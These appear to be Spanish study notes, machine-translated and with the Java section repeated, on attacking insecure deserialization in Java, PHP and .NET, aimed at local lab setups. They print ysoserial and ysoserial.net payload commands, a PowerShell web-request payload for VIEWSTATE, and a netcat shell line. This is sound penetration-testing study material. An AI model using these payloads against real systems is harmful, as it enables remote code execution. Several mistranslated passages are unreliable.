# ataque de serialización

## Que es la serializacion

Serialización es el nombre de los mechanims que nos permite almacenar el estado de los objetos programmísticos en una secuencia de bytes de forma reversible. De esta manera, un objeto (una variable, un conjunto de variables o incluso una clase completa) puede ser transportado de forma remota a otro programa.

* El punto de conexión receptor debe ser capaz de recronstructificar (deserializar) el objeto recibido en un estado sin cambios

se utiliza para

```
-> almacenar y trasferir data
-> Calling remote procedures (RPC-like methods)
```

* Los datos serializados en sí no están cifrados ni firmados de ninguna manera.
* Es posible que haya protocolos de transporte que utilicen la serialización junto con la compresión y el cifrado.
* Por lo tanto, los datos serializados pueden estar ocultos, protegidos o almacenados de forma sencilla.

> &#x20;Los objetos serializados se encuentran con mayor frecuencia en aplicaciones web escritas en PHP, Java y .NET, pero la serialización no se limita solo a estos lenguajes.

### Serialización en Java <a href="#serialization-in-java" id="serialization-in-java"></a>

instale JDK

[https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html](https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html)

Instale JRE

[https://www.oracle.com/technetwork/java/javase/overview/index.html](https://www.oracle.com/technetwork/java/javase/overview/index.html)

javac = Cimpilador de linea de comandos de Java

Cree 2 archivos:

```
- item.java # que contiene el codigo para el nombre de la clase item
- serialize.java # que contiene la logica de la serializacion
```

### Creación de objetos serializados <a href="#creating-serialized-objects" id="creating-serialized-objects"></a>

Para utilizar la serialización, el programa debe importar el paquete **java.io.Serializable.** Además, para que la clase se serialice, debe implementar una interfaz serializable

![[Pasted image 20240311154122.png]]

* **item.java** es una clase que tiene dos campos: id y name
* En la vida real, las clases serializables pueden contener muchos campos y métodos.

Por lo tanto, en otro archivo (en java una clase debe estar contenida en un archivo) que hará uso de esa clase. En primer lugar, creará una instancia de la clase de elemento y, a continuación, serializará esa instancia y la guardará en un archivo
![[Pasted image 20240311154139.png]]
* Convierte la instancia de la clase item en una **secuencia de bytes**
* Luego se guarda en un archivo llamado **data.ser**
* el data.set está en formato binario, pero podemos ver algunos caracteres que no son ASCII

El archivo comienza con:

```
'ac ed 00 05' bytes, which is a standard java serialized format signature
```

> Cuando se usa en aplicaciones web, a menudo se codifica con Base64 El valor binario de **ac ed 00 05** es igual a **rO0AB==**

### Deserialización de datos <a href="#deserializing-data" id="deserializing-data"></a>

Después de compilar y ejecutar la clase Deserialize, podemos ver que el objeto se reconstruyó correctamente

Si cambiamos algo del archivo data.ser y luego intentamos Deserialize, se produce un error

```
java.lang.ClassNotFoundException: Itxm
```
![[Pasted image 20240311154157.png]]
### Condiciones de deserialización inseguras <a href="#insecure-deserialization-conditions" id="insecure-deserialization-conditions"></a>

Al serializar y deserializar datos, el extremo de deserialización debe conocer (debe incluir en su ruta de clase o importación) todas las clases y paquetes que componen el objeto serializado.

* Básicamente, atacar la serialización de Java consiste en pasar el estado malicioso de un objeto al punto final de deserialización.

Ejemplo: Ejecución de comandos del sistema operativo en java:

```
Java.lang.Runtime.getRuntime.exec('whoami')
```

Propiedades y reflexión: Las propiedades de un objeto en su forma más simple se detectan en el formar:

```
Object.one.two
# two is a property of one
# one is a property of Object
```

```
Java.lang.Runtime.getRuntime.exe('id')
# method exec('id') is a property of getRuntime
# which is a property of Java.lava.Runtime
```

* Durante la deserialización, se accede a las propiedades de los objetos de forma recursiva, lo que lleva a la ejecución del código al final de este proceso.

> Se puede reconocer por el orden **de llamada opaco** en el código

> Una condición potencialmente explotable en Java se produce cuando se llama a **readObject()** o a una función similar en un objeto controlado por el usuario y, posteriormente, se llama a un método en ese objeto.

Un atacante es capaz de crear un objeto que contiene múltiples propiedades anidadas, que al llamar al método hará algo completamente diferente

Implementación de un proxy dinámico:

```
https://www.baeldung.com/java-dynamic-proxies
```

controlador de invocacion:

```
https://www.concretepage.com/java/dynamic-proxy-with-proxy-and-invocationhandler-in-java
```

### Gadgets

Cada propiedad o método que forma parte de un objeto de explotación anidado se denomina gadget

* Las bibliotecas de gadgets son algunas bibliotecas de Java que se identificaron para contener gadgets utilizados para crear objetos de explotación serializados.

Primero se presentó como:

```
https://frohoff.github.io/appseccali-marshalling-pickles/
```

No significa que las bibliotecas de gadgets sean inseguras, significa que un atacante puede abusar de ellas para construir una cadena de gadgets conocida que dará lugar a una explotación secreta.

Existe una herramienta llamada **ysoserial** que se puede utilizar para realizar la explotación de vulnerabilidades de deserialización de java inseguras.

```
https://github.com/frohoff/ysoserial
```

### Introduccion a Ysoserial

Se puede descargar junto con el código fuente y un archivo .jar precompilado

![[Pasted image 20240311154241.png]]
Uso:

```
java -jar ysoserial.jar //displays the help message
```

A menudo necesitamos convertir la salida a Base64 para poder enviarla a una aplicación.

```
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 "whoami"
```

> Este comando genera una carga serializada que, al ser deserializada de forma insegura por una aplicación que incluye CommonCollections1 en su ruta de clase, dará como resultado la ejecución del comando **whoami**

Adiciones a Ysoserial:

* Se han desarrollado varias extensiones de Burpsuite Pro para facilitar la detección y explotación de la serialización de Java.

Como:

```
Freddy, Deserialization Bug Finder:
# https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3

Java Deserialization Scanner:
# https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
```

### Ataque de fuerza bruta con Ysoserial <a href="#brute-force-attack-with-ysoserial" id="brute-force-attack-with-ysoserial"></a>

Al acercarse a una aplicación que utiliza datos java serializados, no sabemos qué bibliotecas utiliza el backend.

* En este caso, el enfoque de fuerza bruta podría funcionar. Podemos generar todas las cargas útiles Ysoserial posibles y probar cada una de ellas contra el software de destino

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

> El script se ejecutará y creará una carga serializada codificada en Base64 para cada biblioteca vulnerable. Los archivos resultantes se pueden utilizar además en los ataques de intrusos de eructos

#### Explorando Ysoserial <a href="#exploring-ysoserial" id="exploring-ysoserial"></a>

Cada uno de los archivos _.java_ se puede ejecutar como una clase java independiente, lo que da como resultado la ejecución de un código diferente por parte de la herramienta _Ysoserial_.

* Es posible seleccionar e invocar un solo método de un archivo jar

Con la utilidad java de línea de comandos:

```
-cp (classpath) argument
```

* La ruta de clases contiene todas las ubicaciones en las que la máquina virtual Java buscará los métodos disponibles para el tiempo de ejecución del proceso. En ese caso, necesitamos especificar el archivo Ysoserial .jar como la ruta de clase.

Dentro del paquete Ysoserial hay un exploit de carpeta que contiene varias clases. Cada una de estas clases contiene una utilidad de explotación

Ejemplo ysoserial/exploit/JSF.java:

```
java -cp ysoserial.jar ysoserial.exploit.JSF
```


## Ataque a la serialización
* ¿Qué es la serialización?
* Serialización en Java
* Serialización en PHP
* Serialización de .NET
* Otras serializaciones

Al final de este módulo, deberías tener una mejor comprensión de:

* Mecanismos de serialización
* Cómo encontrar y aprovechar la deserialización que no es de confianza en tecnologías web comunes

### ¿Qué es la serialización? <a href="#what-is-serialization" id="what-is-serialization"></a>

Serialización es el nombre de los mechanims que nos permite almacenar el estado de los objetos programmísticos en una secuencia de bytes de forma reversible. De esta manera, un objeto (una variable, un conjunto de variables o incluso una clase completa) puede ser transportado de forma remota a otro programa.

* El punto de conexión receptor debe ser capaz de recronstructificar (deserializar) el objeto recibido en un estado sin cambios.

Se utiliza para:

```
→ Storing and transferring data
→ Calling remote procedures (RPC-like methods)
```

* Los datos serializados en sí no están cifrados ni firmados de ninguna manera.
* Es posible que haya protocolos de transporte que utilicen la serialización junto con la compresión y el cifrado.
* Por lo tanto, los datos serializados pueden estar ocultos, protegidos o almacenados de forma sencilla.

> Los objetos serializados se encuentran con mayor frecuencia en aplicaciones web escritas en PHP, Java y .NET, pero la serialización no se limita solo a estos lenguajes.

### Serialización en Java[Enlace permanente](https://johnermac.github.io/notes/ewptx/zattackingserialization/#serialization-in-java) <a href="#serialization-in-java" id="serialization-in-java"></a>

Instale JDK:

* https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html

Instale JRE:

* https://www.oracle.com/technetwork/java/javase/overview/index.html
* javac = Compilador de línea de comandos de Java

Cree dos archivos:

```
- item.java # that holds the code For a class names item
- Serialize.java # which contain the serialization logic
```

#### Creación de objetos serializados[Enlace permanente](https://johnermac.github.io/notes/ewptx/zattackingserialization/#creating-serialized-objects) <a href="#creating-serialized-objects" id="creating-serialized-objects"></a>

Para utilizar la serialización, el programa debe importar el paquete **java.io.Serializable.** Además, para que la clase se serialice, debe implementar una interfaz serializable.

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/18.png)

* **item.java** es una clase que tiene dos campos: id y name
* En la vida real, las clases serializables pueden contener muchos campos y métodos.

Por lo tanto, en otro archivo (en java una clase debe estar contenida en un archivo) que hará uso de esa clase. En primer lugar, creará una instancia de la clase de elemento y, a continuación, serializará esa instancia y la guardará en un archivo.

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/19.png)

* Convierte la instancia de la clase item en una **secuencia de bytes**
* Luego se guarda en un archivo llamado **data.ser**
* el data.set está en formato binario, pero podemos ver algunos caracteres que no son ASCII

El archivo comienza con:

```
'ac ed 00 05' bytes, which is a standard java serialized format signature
```

> Cuando se usa en aplicaciones web, a menudo se codifica con Base64 El valor binario de **ac ed 00 05** es igual a **rO0AB==**

#### Deserialización de datos[Enlace permanente](https://johnermac.github.io/notes/ewptx/zattackingserialization/#deserializing-data) <a href="#deserializing-data" id="deserializing-data"></a>

Después de compilar y ejecutar la clase Deserialize, podemos ver que el objeto se reconstruyó correctamente

Si cambiamos algo del archivo data.ser y luego intentamos Deserialize, se produce un error

```
java.lang.ClassNotFoundException: Itxm
```

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/20.png)

#### Condiciones de deserialización insegura

Al serializar y deserializar datos, el extremo de deserialización debe conocer (debe incluir en su ruta de clase o importación) todas las clases y paquetes que componen el objeto serializado.

* Básicamente, atacar la serialización de Java consiste en pasar el estado malicioso de un objeto al punto final de deserialización.

Ejemplo: Ejecución de comandos del sistema operativo en java:

```
Java.lang.Runtime.getRuntime.exec('whoami')
```

Propiedades y reflexión: Las propiedades de un objeto en su forma más simple se detectan en el formar:

```
Object.one.two
# two is a property of one
# one is a property of Object
```

```
Java.lang.Runtime.getRuntime.exe('id')
# method exec('id') is a property of getRuntime
# which is a property of Java.lava.Runtime
```

* Durante la deserialización, se accede a las propiedades de los objetos de forma recursiva, lo que lleva a la ejecución del código al final de este proceso.

→ Reflexión: https://www.oracle.com/technical-resources/articles/java/javareflection.html

> Se puede reconocer por el orden **de llamada opaco** en el código

> Una condición potencialmente explotable en Java se produce cuando se llama a **readObject()** o a una función similar en un objeto controlado por el usuario y, posteriormente, se llama a un método en ese objeto.

Un atacante es capaz de crear un objeto que contiene múltiples propiedades anidadas, que al llamar al método hará algo completamente diferente

Implementación de un proxy dinámico:

```
https://www.baeldung.com/java-dynamic-proxies
```

Controlador de invocación:

```
https://www.concretepage.com/java/dynamic-proxy-with-proxy-and-invocationhandler-in-java
```

#### Gadgets
Cada propiedad o método que forma parte de un objeto de explotación anidado se denomina gadget

* Las bibliotecas de gadgets son algunas bibliotecas de Java que se identificaron para contener gadgets utilizados para crear objetos de explotación serializados.

Primero se presentó como:

```
https://frohoff.github.io/appseccali-marshalling-pickles/
```

No significa que las bibliotecas de gadgets sean inseguras, significa que un atacante puede abusar de ellas para construir una cadena de gadgets conocida que dará lugar a una explotación secreta.

Existe una herramienta llamada **ysoserial** que se puede utilizar para realizar la explotación de vulnerabilidades de deserialización de java inseguras.

```
https://github.com/frohoff/ysoserial
```

### Introducción a Ysoserial

Se puede descargar junto con el código fuente y un archivo .jar precompilado

* https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

Uso:

```
java -jar ysoserial.jar //displays the help message
```

A menudo necesitamos convertir la salida a Base64 para poder enviarla a una aplicación.

```
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 "whoami"
```

> Este comando genera una carga serializada que, al ser deserializada de forma insegura por una aplicación que incluye CommonCollections1 en su ruta de clase, dará como resultado la ejecución del comando **whoami**

Adiciones a Ysoserial:

* Se han desarrollado varias extensiones de Burpsuite Pro para facilitar la detección y explotación de la serialización de Java.

Como:

```
Freddy, Deserialization Bug Finder:
# https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3

Java Deserialization Scanner:
# https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
```

#### Ataque de fuerza bruta con Ysoseria
Al acercarse a una aplicación que utiliza datos java serializados, no sabemos qué bibliotecas utiliza el backend.

* En este caso, el enfoque de fuerza bruta podría funcionar. Podemos generar todas las cargas útiles Ysoserial posibles y probar cada una de ellas contra el software de destino

![Texto alternativo](https://johnermac.github.io/assets/images/posts/ewptx/21.png)

> El script se ejecutará y creará una carga serializada codificada en Base64 para cada biblioteca vulnerable. Los archivos resultantes se pueden utilizar además en los ataques de intrusos de eructos

#### Explorando Ysoserial
Cada uno de los archivos _.java_ se puede ejecutar como una clase java independiente, lo que da como resultado la ejecución de un código diferente por parte de la herramienta _Ysoserial_.

* Es posible seleccionar e invocar un solo método de un archivo jar

Con la utilidad java de línea de comandos:

```
-cp (classpath) argument
```

* La ruta de clases contiene todas las ubicaciones en las que la máquina virtual Java buscará los métodos disponibles para el tiempo de ejecución del proceso. En ese caso, necesitamos especificar el archivo Ysoserial .jar como la ruta de clase.

Dentro del paquete Ysoserial hay un exploit de carpeta que contiene varias clases. Cada una de estas clases contiene una utilidad de explotación

Ejemplo ysoserial/exploit/JSF.java:

```
java -cp ysoserial.jar ysoserial.exploit.JSF
```

La carga útil JSF se puede utilizar para atacar la serialización en el parámetro VIEWSTATE de Java Faces.

> Tenga en cuenta que omitimos la extensión .java, que es asumida por defecto por el entorno java.

### Explotación de la deserialización de Java <a href="#exploiting-java-deserialization" id="exploiting-java-deserialization"></a>

\-> [https://github.com/NickstaDB/DeserLab](https://github.com/NickstaDB/DeserLab)

```
# run the server and client
# open wireshark to sniff the network

# server:
Java -jar DeserLab.jar -server 127.0.0.1 6666

# try to connect with netcat:
nc 127.0.0.1 6666
```

* Podemos ver que el servidor recibió nuestra conexión

Intentemos conectarnos con el cliente de DeserLabs:

```
java -jar DeserLab.jar -client 127.0.0.1 6666
```

* En wireshark podemos ver datos serializados de Java en la comunicación
* Guarde el volcado de wireshark como deerialization.pcap

#### Desciframiento de datos serializados <a href="#deciphering-serialized-data" id="deciphering-serialized-data"></a>

Con el fin de automatizar la revisión de todos los paquetes enviados:

```
tshark tool
# it can extracted the serialization stream

# syntax:
tshark -r deserialization.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^6666,' | cut -d',' -f2 | -tr '\n' ':' | sed s/://g
```

Para cada objeto/valor transportado en datos serializados de Java, hay un byte anterior de cierto valor que identifica su tipo
![[Pasted image 20240311155009.png]]
Podemos inspeccionar cualquier flujo serializado de Java para identificar el objeto que contiene utilizando la herramienta Java Serialization Dumper

```
https://github.com/NickstaDB/SerializationDumper
```

* La herramienta toma una representación hexadecimal de bytes serializados y vuelca los objetos de los que consta la secuencia de bytes.
![[Pasted image 20240311155033.png]]
> La herramienta vuelca todos los objetos que se encuentran en la secuencia serializada

#### Inserción de carga serializada <a href="#injecting-serialized-payload" id="injecting-serialized-payload"></a>

Construiremos un script de python que imite el protocolo de enlace serizalizado inicial (0xaced0005) y luego reemplazaremos los datos serializados (en este caso, el hash de cadena con la carga útil de Ysoserial y esperamos la ejecución del código)

* Según la salida de Serialization Dumper, parte de la comunicación debe imitarse mediante python; Esto incluye el protocolo de enlace, dos estructuras TC\_BLOCKDATA y el nombre de usuario
* Más adelante en nuestro exploit, la cadena hash será reemplazada por datos serializados que se originan en la herramienta Ysoserial

En este caso, se elige la biblioteca Groovy ya que es utilizada por DeserLab.

```
java -jar ysoserial-master-SNAPSHOT.jar Groovy1 "ping 127.0.0.1" > p.bin
```

La carga contiene la firma de serialización java al principio. Dado que la con

versación serializada ya se ha iniciado, debemos eliminarla de la carga útil
![[Pasted image 20240311155055.png]]
Como se mencionó anteriormente, contiene todas las estructuras volcadas por la herramienta SerializationDumper hasta la cadena hash, que se reemplaza por la carga útil Ysoserial sin sus primeros 4 bytes (aced0005)

Ahora escuchemos cualquier paquete ICMP en la interfaz de bucle invertido (127.0.0.1) mientras atacamos el servidor DeserLab usando nuestro exploit recién preparado

```
tcpdump -i lo icmp
python serialization.py
```

> El servidor recibió la conexión y se ejecutó el ping

### Análisis de la carga útil de URLDNS <a href="#analysis-of-urldns-payload" id="analysis-of-urldns-payload"></a>

_URLDNS_ es una carga útil de Ysoserial. No da lugar a la ejecución de código

* En su lugar, hace que el punto de conexión de deserialización resuelva un nombre DNS arbitrario.
* Tiene un bajo impacto, pero por otro lado utiliza características integradas de Java, por lo que es probable que funcione en casi todos los casos.

```
https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
```

Podemos observar una cadena de artilugios de 4 objetos

Cadena de gadgets:

```
HashMap.readObject()
  HashMap.putVal()
    HashMap.hash()
      URL.hashCode()
```

\*HashMap.readObject()\*\* hace que Java cree una instancia del objeto deserializado tras una deserialización exitosa. El mapa hash contiene un objeto URL con hash, que debido a los mecanismos incorporados de Java, se resolverá correctamente.

* Está diseñado en el método público getObject
* HashMap es un tipo de datos Java que almacenaba datos en pares clave-valor, y a menudo se usa en exploits de deserialización

En primer lugar, **se usa SilentURLStreamHandler** para no resolver la dirección URL al crear el objeto serializado. La variable **url** es la URL proporcionada por el usuario que se va a resolver.

* línea 55, se define un nuevo HashMap
* luego, se asigna un tipo de datos java.net.URL al Hashmap, a la clave **u**
* a continuación, se calcula el código hash de la URL. Tras la deserialización, la URL en la que se calculó el código hash se resolverá, lo que dará como resultado una resolución de DNS arbitraria.

### Exploit de resolución de DNS arbitrario <a href="#arbitrary-dns-resolution-exploit" id="arbitrary-dns-resolution-exploit"></a>

La carga útil se genera en el archivo p.bin, que se utilizó anteriormente para ejecutar ping

```
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://somethingnonexistent.com > DeserLab/DeserLab-v1.0/p.bin
```

> si tiene Burp Suite Pro, puede usar el cliente de colaborador para generar y capturar solicitudes de DNS

DNSChief se utilizará como un proxy DNS simple. Puedes clonarlo desde su repositorio de GitHub:

```
https://github.com/iphelix/dnschef
```

Añadir a /etc/resolv.conf

```
nameserver 127.0.0.1
```

Inicie DNSChief y verifique si funciona correctamente intentando hacer ping a un dominio inexistente:

```
ping oahsdhuasdo.com
```

* Ahora podemos ejecutar la carga útil (p.bin) y ver si se realiza la búsqueda
* Las cargas útiles de URLDNS se pueden usar para detectar problemas de deserialización antes de que pueda intentar atacarlos con cargas útiles de RCE completo
* Las cargas útiles ysoseriales que dan como resultado la ejecución de código se basan en objetos anidados similares, sin embargo, pueden ser mucho más complicadas e involucrar varios objetos y sus propiedades

### Solución de problemas de Ysoserial <a href="#troubleshooting-ysoserial" id="troubleshooting-ysoserial"></a>

Para poder confirmar si la aplicación es segura o no, debe estar familiarizado con los tipos de excepción que se pueden lanzar durante el proceso de ataque.

* Ysoserial es una herramienta de explotación ciega, por lo que, además de la resolución de DNS, conocer los tipos de excepción podría ayudar a evaluar una posible superficie de ataque
* Al atacar, u debe ser consciente de dónde proviene la excepción. El propio Ysoserial imprime trazas de pila detalladas cuando se usa incorrectamente

Al leer el seguimiento de la pila, si encuentra una **ClassNotFoundException**, es probable que la aplicación de destino no utilice la biblioteca de gadgets utilizada por la carga usoserial. A continuación, puede intentar usar una carga útil diferente que tenga como destino otra biblioteca

* Si ha encontrado **java.io.IOException** con el mensaje _No se puede ejecutar el programa_, es una buena señal porque la carga útil ha funcionado. Sin embargo, la aplicación a la que quería llamar no está disponible por alguna razón (ejemplo: no existe)

Al decirle a ysoserial que cree una carga útil relacionada con RCE, debe tener en cuenta sus limitaciones:

* No se admiten redirecciones de salida ni canalizaciones
*   Los parámetros del comando no pueden contener espacios; Por lo tanto, mientras:

    ```
    nc -lp 4444 -e /bin;sh# is ok
    python -c import socket;... # will not work because the parameter (import socket) to Python contains a space
    ```

### Detección de objetos serializados de Java <a href="#spotting-java-serialized-objects" id="spotting-java-serialized-objects"></a>

Preste atención a los datos binarios, especialmente si comienzan con:

```
"aced0005" hex
"rO0aB"    base64
looks like a list of java classes (eg "org.apache.somethig", "java.lang.String")
# Presence of such data may indicate that the target application is deserializing custom data.
```

#### Lecturas recomendadas <a href="#recommended-reading" id="recommended-reading"></a>

```
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- https://github.com/Coalfire-Research/java-deserialization-exploits
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
- https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
```

### Serialización en PHP <a href="#serialization-in-php" id="serialization-in-php"></a>

También conocido como inyección de objetos PHP

* PHP utiliza las funciones serialize() y unserialize() para almacenar, transferir y transformar objetos completos.
* A diferencia de Java, la serialización de PHP está en formato no binario, tiene un aspecto similar a una matriz JSON y es legible por humanos.

Parece:

```
0:6:6"Abcdef":1:1{s:9:"Something";s:6:"Active";}
```

Por ejemplo:

```
Booleans are serialized as 'b:<i>;' # where i is 0 or 1 (true/false)

Strings are serialized as 's:<i>:"<s>";' # where is is the string length and s is the string itself

Arrays are serialized as 'a:<i>:{<elements>}' # where i is an integer representing the number of elements in the array, and elements are zero or more serialized key value pairs of the following form, '<key><value>'

Objects (classes) are serialized as 'O:<i>:"<s>":<i>:{<properties>}' # where the first <i> is an integer representing the string length of <s> and <s> is the fully qualified class name
  ⇒ the second <i> is an integer representing the number of object properties, and <properties> are zero or more serialized name-value pairs
  ⇒ In the <name><value> pair, <name> is a serialized string representing the property name, and <value> is any value that is serializable
  ⇒ Also, <name> is represented as 's:<i>:"<s>";' where <i> is an integer representing the string length of <s>

The visibility of properties influences the value of <s> in the following ways:
  ⇒ With public properties, <s> is the simple name of the property
  ⇒ With protected properties, <s> is the simple name of the property, prepended with \0*\0 - an asterix enclosed in two NULL bytes (0x00)
  ⇒ With private properties, <s> is the simple name of the property, prepended with \0<s>\0 - <s> and enclosed in two NULL bytes, where <s> is the fully qualified class name
```

#### Además, el formato de datos serializados de PHP <a href="#moreover-php-serialized-data-format" id="moreover-php-serialized-data-format"></a>

→ [http://www.phpinternalsbook.com/php5/classes\_objects/serialization.html](http://www.phpinternalsbook.com/php5/classes\_objects/serialization.html)

[→ ](https://www.geeksforgeeks.org/php-serializing-data/)https://www.geeksforgeeks.org/php-serializing-data/

> Es posible que a menudo encuentre que los datos serializados de PHP están codificados en Base64 con fines de transporte. Nunca deje ningún dato de Base64 sin inspeccionar.

#### Métodos mágicos <a href="#magic-methods" id="magic-methods"></a>

Son funciones que se lanzan dinámicamente una vez que está presente un determinado disparador. Se pueden reconocer en el código por dos guiones bajos al principio de sus nombres, por ejemplo:, **\_\_construct()**

Los disparadores para las clases PHP son:

```
__construct() is loaded upon creating a new instance of a class
__destruct() is loaded when no more references of a current class are present in memory
__wakeUp() is loaded upon deserializing an object
```

Además

→ [https://www.php.net/manual/en/language.oop5.magic.php](https://www.php.net/manual/en/language.oop5.magic.php)
![[Pasted image 20240311155142.png]]
![[Pasted image 20240311155222.png]]
Primero vamos a crear un archivo history.lol:

```
touch history.lol
```

* Cambiemos la variable $serialize de **history.log** a **history.lol.** Como la longitud del nombre de archivo es la misma, no es necesario cambiar la información de longitud de la cadena en los datos serializados.

> Podemos observar que la función destructora se ejecuta en el archivo history.lol, que fue eliminado. De esta manera, pudimos manipular los datos PHP serializados para alterar el comportamiento original del archivo.

En este ejemplo, los datos serializados se pasaron en una variable para simplificar el ejemplo

en el mundo real, estos datos a menudo provienen de otras fuentes, por ejemplo:

```
HTTP requests parameters
```

La explotación de este tipo de vuln fue posible porque:

```
- We had access to the source code, so we knew what the script exactly does
- We had access to the original serialized payload, so we knew what to alter in it
- The vuln function was implemented in the default destructor, so the data was used after the deserialization. There could be a case when data is unserialized but not used in an insecure manner.
```

Lógica de deserialización agregada al código:
![[Pasted image 20240311155251.png]]
Tras la deserialización, se ejecutarán los métodos mágicos de la clase para que el archivo se elimine en la función destructora:
![[Pasted image 20240311155303.png]]
### Serializacion de .NET

* Utiliza algunos mecanismos diferentes para la serialización y deserialización de datos. Los datos serializados con uno de estos mecanismos deben deserializarse con el mismo.

#### Tipos de serialización de .NET <a href="#net-serialization-types" id="net-serialization-types"></a>

El guardado de los estados de los objetos mediante la serialización en .NET se puede realizar mediante varios métodos:

```
- BinaryFormatter
- DataContractSerializer
- NetDataContractSerializer
- XML Serialization
```

Los datos serializados de BinaryFormatter en un archivo binario y los datos serializados mediante XML Serialized están en formato XML legible

* El uso de ellos es situacional y está conectado a los componentes internos de .NET.
* Vamos a ver el uso de Ysoserial.net, que es similar al de java.

Ejemplo de BinaryFormmater:

```
- The app serialized a string and writes the output to a file
- The file is in binary format, as the name implies
```

Después de ejecutar la aplicación, podemos inspeccionar los datos serializados en el archivo. De hecho, está en formato binario.

```
type data.dat
```

* Puede esperar que los datos .NET serializados que se encuentran en las aplicaciones web estén codificados en Base64 para enviar cómodamente caracteres no ASCII en solicitudes y respuestas HTTP.

#### Detección de datos serializados de .NET <a href="#spotting-net-serialized-data" id="spotting-net-serialized-data"></a>

Un lugar común, pero no el único, donde se pueden encontrar datos serializados es cuando los datos se envían en un parámetro VIEWSTATE o servicios remotos de .NET.

* Los servicios de comunicación remota de .NET se pueden considerar parte del mundo de las aplicaciones web, pero también forman parte de la infraestructura
* La comunicación remota de .NET es la mecánica que permite enviar objetos .NET puros a través de TCP; sin embargo, en función de la infraestructura de la aplicación, las aplicaciones web pueden proporcionar una capa de transporte para suministrar datos destinados a un punto de conexión remoto de .NET.

Ejemplos de explotación remota de .NET a través de HTTP: → https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/

→ https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/

#### ESTADO DE VISTA <a href="#viewstate" id="viewstate"></a>

Es un parámetro web que se usa en la mayoría de las aplicaciones web .NET para conservar el estado de la página web actual

Viewstate es el estado de la página y todos sus controles. El marco de trabajo ASP.NET lo mantiene automáticamente en toda la aplicación web

* Cuando una página se devuelve al cliente, se determinan los cambios en las propiedades de la página y sus controles y, a continuación, se almacenan en el valor de un nombre de campo de entrada oculto \_\_VIEWSTATE
* Con cualquier otra solicitud POST, el campo \_\_VIEWSTATE se envía al servidor junto con otros parámetros

#### Contramedidas contra la manipulación de VIEWSTATE <a href="#countermeasures-against-viewstate-tampering" id="countermeasures-against-viewstate-tampering"></a>

Opción MAC habilitada: el estado de vista está firmado con una clave criptográfica conocida solo por el lado del servidor. Se configura mediante la siguiente configuración/opción:

```
<page enableViewStateMac="true" />
```

* En web.config o en la configuración de la validación de MAC **en el administrador de IIS**, la versión más reciente de .NET Framework usa la validación de MAC de forma predeterminada
* si la clave está codificada, es posible que se filtre como resultado de vulnerabilidades de lectura de archivos como XXE, inclusión de archivos o similares

Es posible cifrar el estado de vista configurando la configuración web:

```
<page ViewStateEncryptionMode="Always"/>
```

> esto también se puede hacer a través de la consola de administración de IIS

Para habilitar el servidor IIS de Windows, vaya a:

```
Control Panel > Programs > Turn windows features on or off
Select Internet Information Services (IIS)

# The files served by the IIS will be present in the standard directory:
c:\inetpub\wwwroot
```

* Si configuró el servidor correctamente, reinicie la PC y vaya a http://127.0.0.1
* open burp para observar el tráfico HTTP

En el directorio wwwroot, crearemos 3 archivos:

```
- hello.aspx (the frontend logic)
- hello.aspx.cs (backend)
- web.config (the IIS standard config file)
```

![[Pasted image 20240311155331.png]]

![[Pasted image 20240311155348.png]]
![[Pasted image 20240311155406.png]]

El resultado es un área de texto, al hacer clic en el botón se muestra el texto que escribiste

* El archivo web.config indica al servidor web que no requiera la validación MAC del parámetro \_\_VIEWSTATE
* Esto nos permite manipular el parámetro y el servidor intentará deserializarlo de todos modos

#### Prueba de burpsuite <a href="#test-burp" id="test-burp"></a>

Ve a la página, haz clic en el botón con algo de texto y captúralo en ERUCTO

* Envíe la solicitud a **Repeater** y navegue hasta la pestaña **ViewState** en Burp
* ¡Eructar muestra información de que MAC no está habilitado!

Generemos una carga útil usando **ysoserial.net** y la coloquemos en el parámetro viewstate. La carga útil realizará una solicitud HTTP simple, ya que este es el enfoque adecuado antes de probar cargas útiles RCE más específicas

```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd"
```

Podemos ver que el agente de escucha netcat recibió una solicitud de Windows Powershell:

```
nc -lvnp 9000
```

La respuesta del servidor contiene el código de error 500; Sin embargo, se ejecuta powershell. Usando la herramienta Process Hacker podemos confirmar que, efectivamente, IIS generó el proceso de PowerShell

> Hemos logrado RCE a través de la deserialización de .NET VIEWSTATE

**2ª prueba - Se modificó el archivo .cs**

![[Pasted image 20240311155425.png]]

ahora podemos ver en BURP que el parámetro VIEWSTATE ya no está presente en las solicitudes del sitio web

* Pero si agregamos el parámetro viewstate de todos modos, la ejecución del código aún funciona

![[Pasted image 20240311155441.png]]

Cuanto más tardía sea la versión de .NET Framework, más difícil será alterar el estado de vista

* Si la validación MAC está habilitada, podría ser posible explotar la deserialización basada en viewstate solo si la clave MAC está codificada (por ejemplo, web.config)
* La configuración predeterminada actual de IIS es generar la clave en tiempo de ejecución y es diferente para cada aplicación

Además:

```
- https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
- https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
